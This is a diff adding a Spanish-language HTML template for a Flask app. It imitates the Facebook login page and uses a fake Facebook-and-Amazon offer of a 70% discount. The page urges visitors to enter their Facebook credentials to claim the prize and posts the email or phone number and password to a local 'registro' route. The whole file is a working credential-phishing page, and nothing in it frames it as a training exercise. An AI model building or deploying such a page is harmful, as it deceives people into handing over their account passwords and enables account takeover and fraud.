@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="{{url_for('static', filename='css/style.css')}}">
+    <title>Facebook - Inicio de sesión o regístrate</title>
+    <link rel="shortcut icon" href="{{url_for('static', filename='img/icon_favi.png')}}">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
+
+</head>
+
+<body>
+    <div class="container">
+        <div class="container-profile">
+            <span class="logo">
+                <span><img src="{{ url_for('static', filename='img/amazon.png')}}" class="img-fluid"></span>
+            </span>
+            <p class="connect-friends">Facebook y Amazon, te regalan 70% de descuento en tus compras.
+                <br>
+                <p style="color: red; padding:30px;">Registre sus credenciales de facebook para acceder al premio.</p>
+            </p>
+        </div>
+        <div class="container-form">
+        <img src="{{ url_for('static', filename='img/1.svg')}}" class="img-fluid">
+            <form class="form" method="post" action="{{url_for('registro')}}">
+                <input type="text" name="username" placeholder="Correo electronico o numero de telefono" required>
+                <input type="password" name="password" placeholder="Contraseña" required>
+                <input type="submit" value="Iniciar Sesión">
+                <span><a href="#">¿Olvidaste tu contraseña?</a></span>
+                <div class="border"></div>
+                <button><a href="#">Crear cuenta nueva</a></button>
+            </form>
+            <p class="create-page">
+                <a href="https://www.facebook.com/pages/create/">Crear una página</a> para una celebridad , una marca o un <br> negocio.
+            </p>
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-Fy6S3B9q64WdZWQUiU+q4/2Lc9npb8tCaSX9FK7E8HnRr0Jz8D6OP9dO5Vg3Q9ct" crossorigin="anonymous"></script>
+</body>
+
+</html>
